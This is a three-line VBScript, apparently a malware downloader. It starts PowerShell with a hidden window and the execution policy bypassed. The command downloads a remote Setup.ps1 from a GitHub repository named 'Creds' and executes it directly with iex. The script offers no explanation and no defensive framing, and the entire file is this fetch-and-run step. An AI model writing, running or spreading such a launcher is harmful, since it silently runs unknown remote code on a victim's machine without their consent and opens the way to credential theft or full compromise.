command = "powershell.exe -nologo -noninteractive -ExecutionPolicy Bypass -command ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/IgorAlaf/Creds/main/Setup.ps1')"""
set shell = CreateObject("WScript.Shell")
shell.Run command,0, false
